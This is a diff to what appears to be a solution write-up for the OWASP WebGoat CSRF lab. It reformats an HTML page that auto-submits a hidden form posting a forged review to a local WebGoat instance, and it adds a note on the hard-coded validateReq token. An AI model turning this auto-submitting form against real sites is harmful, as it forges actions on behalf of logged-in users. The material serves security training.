@@ -68,10 +68,16 @@ You can find the solution to this exercise in the `OWASP WebGoat` [Solutions - L
    ```html
    <html>
       <body>
-         <form action="http://localhost:48080/WebGoat/csrf/review" method="POST"><input type="hidden" name="reviewText" value="This is an example of an CRSF attack!"><input type="hidden" name="stars" value="5"><input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9"></form>
+         <form action="http://localhost:48080/WebGoat/csrf/review" method="POST">
+            <input type="hidden" name="reviewText" value="This is an example of an CRSF attack!">
+            <input type="hidden" name="stars" value="5">
+            <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
+         </form>
          <script>document.forms[0].submit();</script>
       </body>
    </html>
    ```
 
-**Note:** The CSRF attack will not work if the user is not logged into the application when opening this `html` file.
+**Notes:** 
+- The `validateReq` field is a (hard-coded) token used by the server to authenticate requests. To inspect it dynamically, post a normal comment in the application and check the browser's network tab.
+- The CSRF attack will not work if the user is not logged into the application when opening this `html` file.
